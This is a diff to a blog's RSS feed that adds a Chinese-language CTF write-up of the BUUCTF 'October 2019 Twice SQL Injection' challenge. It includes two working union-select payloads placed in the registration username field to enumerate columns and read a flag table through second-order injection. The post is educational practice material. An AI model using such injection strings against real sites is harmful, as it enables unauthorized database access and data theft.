@@ -5,8 +5,8 @@
         <link>http://odiws.github.io</link>
         <description></description>
         <language>en</language>
-        <pubDate>Mon, 03 Jun 2024 19:43:07 +0800</pubDate>
-        <lastBuildDate>Mon, 03 Jun 2024 19:43:07 +0800</lastBuildDate>
+        <pubDate>Sun, 16 Jun 2024 14:35:04 +0800</pubDate>
+        <lastBuildDate>Sun, 16 Jun 2024 14:35:04 +0800</lastBuildDate>
         <category>buuctf</category>
         <category>system_file</category>
         <category>sql文件读取</category>
@@ -76,6 +76,31 @@
         <category>python_seed函数</category>
         <category>session伪造</category>
         <category>js-vm沙箱逃逸</category>
+        <category>willphp2.2</category>
+        <category>ssti-smarty3.1.39</category>
+        <item>
+            <guid isPermalink="true">http://odiws.github.io/2024/06/16/Injection/</guid>
+            <title>October 2019 Twice SQL Injection</title>
+            <link>http://odiws.github.io/2024/06/16/Injection/</link>
+            <category>buuctf</category>
+            <category>sql injection</category>
+            <pubDate>Sun, 16 Jun 2024 14:35:04 +0800</pubDate>
+            <description><![CDATA[ &lt;h2 id=&#34;october-2019-twice-sql-injection&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#october-2019-twice-sql-injection&#34;&gt;#&lt;/a&gt; October 2019 Twice SQL Injection&lt;/h2&gt;
+&lt;p&gt;二次注入（个人理解二次注入不是立马生效，而是在另一个界面时被调用，SQL 语句在那个界面被调用生效）&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;../images/October2019TwiceSQLInjection/2.png&#34; alt=&#34;2&#34;&gt;&lt;/p&gt;
+&lt;p&gt;进行注册；&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;../images/October2019TwiceSQLInjection/3.png&#34; alt=&#34;3&#34;&gt;&lt;/p&gt;
+&lt;p&gt;（ps：跟我做的登陆页面好像）&lt;/p&gt;
+&lt;p&gt;注入点就在这里 username，没有任何过滤，但是很难想到，因为进去后有一个修改信息的东西过滤了‘和 “，我直接在那里面搞好久，发现不能用宽字节绕过，（然后就不知道怎么办 了）所以就看了 wp，发现就是这里有注入点。&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-none&#34;&gt;
+username =1&#39; union select group_concat(column_name) from information_schema.columns where table_name=&#39;flag&#39;#
+
+username =1&#39; union select flag from flag #
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;常规操作，但是没找到注入点，有点可惜。&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;../images/October2019TwiceSQLInjection/1.png&#34; alt=&#34;1&#34;&gt;&lt;/p&gt;
+ ]]></description>
+        </item>
         <item>
             <guid isPermalink="true">http://odiws.github.io/2024/06/03/GYCTF2020-Ezsqli/</guid>
             <title>&#39;[GYCTF2020]Ezsqli&#39;</title>
